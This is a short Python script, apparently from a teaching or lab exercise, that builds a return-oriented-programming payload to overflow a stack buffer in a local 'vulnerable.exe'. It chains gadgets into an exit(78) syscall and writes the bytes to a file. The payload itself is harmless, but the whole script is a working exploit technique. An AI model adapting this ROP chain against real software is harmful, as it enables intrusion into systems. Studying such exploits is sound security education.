import os, sys
import subprocess
import collections
from exploitsCommon import *


if __name__ == "__main__":
    changeCWDToScriptDirectory()

    print('Scanning bytes...')
    instrSequences = getInstructionSequenceOutput('vulnerable.exe')

    payloadComponents = [
        b'\xFF' * 100, # Add padding to get over the stack buffer.
        b'\xFF' * 12, # Add padding to get over ??.
        b'\xFF' * 8, # Add padding to get over the stored RBP value.

        # RDI = returnCode;
        findInstructionSequenceAddress(instrSequences, 'pop rdi; ret'),
        (78).to_bytes(8, 'little'),

        # RAX = 60; (system call number for `exit();`)
        findInstructionSequenceAddress(instrSequences, 'pop rax; ret'),
        (60).to_bytes(8, 'little'),

        # call `exit(RDI);`
        findInstructionSequenceAddress(instrSequences, 'syscall; ret'),

        # Add more padding to make sure we go over the hardcoded stack buffer length.
        b'\xFF' * 100,
    ]

    payload = b''.join(payloadComponents)
    print(f"payload = {payload.hex()}")

    with open('syscallExitPayload.dat', 'wb') as fout:
        fout.write(payload)
